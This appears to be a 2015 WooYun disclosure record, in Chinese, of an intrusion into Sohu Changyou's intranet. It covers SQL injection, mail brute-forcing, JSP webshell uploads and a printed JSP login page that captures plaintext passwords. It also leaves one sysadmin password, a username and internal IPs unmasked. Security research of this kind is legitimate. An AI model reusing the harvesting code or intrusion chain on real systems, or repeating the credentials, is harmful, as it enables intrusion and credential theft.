{"id": 34269, "wybug_id": "wooyun-2015-0130908", "wybug_title": "游戏行业安全之搜狐畅游内网可大漫游(大量信息泄漏/服务器权限/可持续APT攻击)", "wybug_corp": "搜狐畅游", "wybug_author": "蓝冰", "wybug_date": "2015-08-01 16:03", "wybug_open_date": "2015-09-15 18:50", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "渗透测试思路", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向公众公开  简要描述： 每一个漫游 都为闪电而努力着 呵呵呵~审核看完帮打下码哈 详细说明：  0x00首先搜狐畅游比我想像中要大很多很多,内网权限也分的很细,加上本人正在实习中,每天累成狗,所以没能撸穿,不过感觉持续APT应该没问题 哈哈0x01内网入口点:http://workflow.cyou-inc.com:89/login.do 泛微的OA系统登录框存在POST注入 但是把select给禁了,但并不妨碍我们获取密码,直接上python脚本\n\nmask 区域\n*****Desktop/py &gt**********min**********n : **********n : **********n : **********n : **********: 8E5**********: 8E5**********: 8E5**********: 8E5**********8E5F3F**********8E5F3F**********8E5F3F**********8E5F3F**********8E5F3F**********5F3FE21**********cod*****\n\n最终 sysadmin的密码为asdf!@#321用这个密码是登录不了80端的 他们80端设为统一认证,于是首先登录移动端,随后找到一个接口,简单写个脚本 把所有员工的姓名dump下来 然后用在线中文转拼音制作一份用户名字典接下来该干吗不用多说了吧 嘿嘿嘿https://mail.cyou-inc.com/爆破搞起,获取如下\n\nmask 区域\n*****ode**********: Cyou********** abcd.**********: abc********** : abc**********bcd.1********** abcd********** abcd.********** : abc********** abcd**********abcd.********** abcd.**********: abc********** abcd.**********cod*****\n\n下一步登录邮箱找vpn信息,某位同学很友好的把思科的pcf打包好了,随后用邮箱用户密码登录vpn\n\n0x02接着继续邮箱信息收集,利用统一认证的优势进入多个系统和服务器\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这个系统吊了 可以下载源代码 含各种核心站点源码 包括主站auth.changyou.com的源码 里面各种密码 我就不贴了免的引起不好的影响,不过畅游的权限控制挺严的,有了也连不上\n\n该系统头像上传处可传一个jsp 成功getshell\n\n虽然有外网IP但连不上,认证机制也是调用的统一认证,不过幸运的是用户密码是POST提交到这个系统然后由该系统请求LDAP认证,于是把登录页替换掉抓取明文密码\n<%@ page import=\"java.io.*\"%> <%   String username = request.getParameter(\"userName\");  String password = request.getParameter(\"password\");   RandomAccessFile rf=new RandomAccessFile( \"/home/htdocs/ims/ims/auth.txt\",\"rw\");   rf.seek(rf.length());  rf.writeBytes(username+\":\"+password+\"\\n\");   rf.close();%> <script src=\"../js/jquery-1.7.2.min.js\" type=\"text/javascript\"></script><script>$.post(\"../ims/login.act\", {userName:'<%out.print(username);%>',password:'<%out.print(password);%>'},function(data) {var a = '<input id=\"password\" tabindex=\"2\" type=\"password\"';if(data.indexOf(a) > 0 ){window.location.href=\"http://10.127.65.174:8080/ims/login!openLogin.act?errorMessage=3\";}else{window.location.href=\"http://10.127.65.174:8080/ims/mainMenu!openIndex.act\"}});</script>\n成功获取到一个密码\n\nmask 区域\n*****ode**********sdJIAN**********cod*****\n\n登录该邮箱获得一个服务器权限\n\n\n\n可长期APT抓取密码继续~\n10.1.8.214 \n\nmask 区域\n\n*****：db**********h@ngy0**********r/local/r**********h@rge_Ch*****\n\n\n\n\n可以从VPN连到该服务器\n\n\n\n是EHR DB服务器下面的是堡垒机\n\n\n新密码如下：用户名：tianlong3d\n\nmask 区域\n\n*****g3d@q14yw*****\n\n\n\n\n\n\n\n\n\n\n0x03内网第二入口点:由于VPN限制了很多系统的访问,于是试试能不能在获得一个服务器shell在偶然的机会登录了OA系统,系统里面有一个旧OA链接系统URL:http://workflow.cyou-inc.com:1122该端口上的泛微存在上传漏洞,直接上传一个jsp 成功getshell,随后发现该ip可以访问SVN密码查询系统\n\n在该服务器上发现一枚LDAP连接信息\n\nmask 区域\n*****ode**********ic=l**********type=**********auto=**********typ**********un.jndi.ldap*****1.://**.**.**//10.6.125.11:389     _*****cyou-inc**********l=OAAut**********tials=**********cod*****\n\n\n\n目测畅游的所有域信息都在这里了 不过不存密码 有点悲剧 哈哈下一步用该服务器代理进内网访问SVN密码查询系统,搞到一批SVN权限\n\nmask 区域\n*****ode**********nji*****1.svn://**.**.**2.svn://**.**.**3.svn://**.**.*******ing*****4.svn://**.**.*******ian*****5.svn://**.**.*******ngx*****6.svn://**.**.*******ngg*****7.svn://**.**.*******na*****8.svn://**.**.*******xu*****9.svn://**.**.*******oxi*****10.svn://**.**.**11.svn://**.**.*******cod*****\n\n邮箱搜集一批svn地址\n\n\nmask 区域\n\n1.svn://**.**.**/YD/develop_2.svn://**.**.**/YD/project _3.svn://**.**.**/YD/testing _4.svn://**.**.**/YD/product _***************P*****5.svn://**.**.**/PLATFORM/0_Private_*****维^*****6.svn://**.**.**/PLATFORM/1_系统运维中心_*****^^*****7.svn://**.**.**/PLATFORM/2_用户中心_*****^^*****8.svn://**.**.**/PLATFORM/3_数据中心_*****^^*****9.svn://**.**.**/PLATFORM/4_技术中心_*****^^*****10.svn://**.**.**/PLATFORM/5_(资源中心)/1_翻译部_*****^^^*****11.svn://**.**.**/PLATFORM/5_(资源中心)/2_资产管理部_*****M*****12.svn://**.**.**/PLATFORM/5_(资源中心)/3_PMO_**********13.svn://**.**.**/MLDJClient/MLDJ/OperationMaintenance_14.svn://**.**.**/pt/pingtaidoc/1项目/11用户中心-基础应用部_15.svn://**.**.**/Network/bet _16.svn://**.**.**/Network/poplauncher_17.svn://**.**.**/VideoIntegration/src 代码库_18.svn://**.**.**/VideoIntegration/doc文档库_19.svn://**.**.**/VideoIntegration/res 资源库_***************^^*****20.svn://**.**.**/Internet/cypayorder_*****^AP*****21.svn://**.**.**/Internet/ cypayopenapi_*****^*****22.svn://**.**.**/Internet/cypaystat_*****^*****23.svn://**.**.**/Internet/cypayWebPortal_*****^^*****24.svn://**.**.**/Internet/operation_manage_*****^^*****25.svn://**.**.**/Internet/account/branches/accounts_clearing/accounts_clearing   _26.svn://**.**.**/Internet/clearing/branches/accounts_orders/accounts_orders     _27.svn://**.**.**/Internet/account/branches/accounts_balance/accounts_balance_***************统*****28.svn://**.**.**/Internet/cypayoa_*****系*****29.svn://**.**.**/Internet/cypayconsole _*****^^*****30.svn://**.**.**/Internet/cypay_merchant_*****录^*****31.svn://**.**.**/Internet/cypaycas_**********32.svn://**.**.**/dc_33.svn://**.**.**/gd_34.svn://**.**.**/projectx_35.svn://**.**.**/spec_36.svn://**.**.**/x_pat\n\n\n\n捡到一个桃源GM账号 测试可登录\n\n\n\nmask 区域\n\n*****ou.com   j*****\n\n\n\n\n0x04接着就是checkout svn 获得大量敏感信息.\nzabbix监控http://10.127.2.185/zabbix/index.phptlbb3dtlbb3d.mrd\n\n\n百度统计\n\n\n\n拿下又一台服务器\n\n畅游的服务器列表\n\nbbs.cy.com的配置信息验证发现UC_KEY跟线上的一样不过可能config文件没有写入权限,不过有了UC_KEY大家都懂的,此外还包含各种站点的源码我就不贴了哈\n\n风云的GM工具 嘿嘿 看了说明 配置挺麻烦的 还得装一个控件\n\nGM命令表\n\n\n\n\n\n这个又吊了 包含了畅游所有正在使用的系统,包含系统URL地址,SVN地址,相关负责人名单有了这个 加上之前的钓鱼页面 长期APT攻击 获取密码 查SVN密码 登录SVN,登录邮箱,登录堡垒机撸穿只是时间问题简单看了这些系统 随手又进入一个系统\n\n   漏洞证明：  已证明   修复方案：  猪一样的队友,还是要加强员工们对密码策略的认识所有为了证明而获取到的内部信息均已删除 请勿查水表: )   版权声明：转载请注明来源 蓝冰@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-01 18:49 厂商回复： 正在处理，感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-01 16:12 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 每日必关注乌云)\t\t \n  牛B的像道闪电！前排戴好3D眼睛，震撼撸站视觉效果！    \n     2015-08-01 17:51 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  这标题改的好别扭啊    \n     2015-08-01 20:26 |    \t\tkow \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:4        | 研表究明，汉字的序顺并不定一能影阅响读，...)\t\t \n  太牛逼了，说漫游就漫游啊~~    \n     2015-08-02 00:46 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @kow 累啊 还要上班 在公司还撸不了    \n     2015-08-22 13:31 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:55        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  此漏洞居然没有闪电？不符合逻辑！！！    \n     2015-08-29 11:18 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:16        | Wow~~~哈哈~~~)\t\t \n  ATP攻击！！还是看不到呀    \n     2015-09-15 18:55 |    \t\t有点小鸡冻 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  警察叔叔这里有黑客........    \n     2015-09-15 20:53 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:245        | 我有个2b女友！)\t\t \n   怎么注入出来的呀 一跑就是几千个表    \n     2015-09-15 23:50 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @mango 因为注入在登陆框 直接字段布尔盲注就行啦    \n     2015-09-16 10:04 |    \t\troger \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 请多多关注！)\t\t \n  @蓝冰 牛啊，说漫游就漫游，高    \n     2015-09-16 11:42 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @roger 过奖过奖 ^_^    \n     2015-09-16 13:52 |    \t\t小太爺 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我就是来裹乱的......)\t\t \n  厉害厉害    \n     2015-09-16 15:41 |    \t\t憋屈 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:7        | 我是天空里的一片云，偶尔投影在你的波心。)\t\t \n  牛逼的不要不要的。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}